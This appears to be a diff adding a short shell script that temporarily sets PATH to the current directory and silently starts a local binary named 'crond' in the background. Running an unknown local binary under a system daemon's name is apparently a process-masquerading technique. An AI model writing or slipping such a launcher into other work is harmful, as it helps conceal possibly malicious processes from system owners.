@@ -1,0 +1,6 @@
+#!/bin/sh
+realpath=`echo $PATH`
+export PATH="."
+crond >>/dev/null&
+export PATH="$realpath"
+sleep 3
